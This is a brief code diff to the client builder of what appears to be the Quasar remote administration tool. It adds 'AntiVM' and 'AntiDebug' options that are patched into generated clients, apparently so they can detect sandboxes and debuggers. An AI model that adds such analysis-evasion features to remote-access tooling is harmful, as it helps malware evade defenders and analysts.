@@ -174,6 +174,12 @@ namespace Quasar.Server.Build
                                         case 7: // UnattendedMode
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(true));
                                             break;
+                                        case 8: // AntiVM
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.AntiVM));
+                                            break;
+                                        case 9: // AntiDebug
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.AntiDebug));
+                                            break;
                                     }
                                     bools++;
                                 }
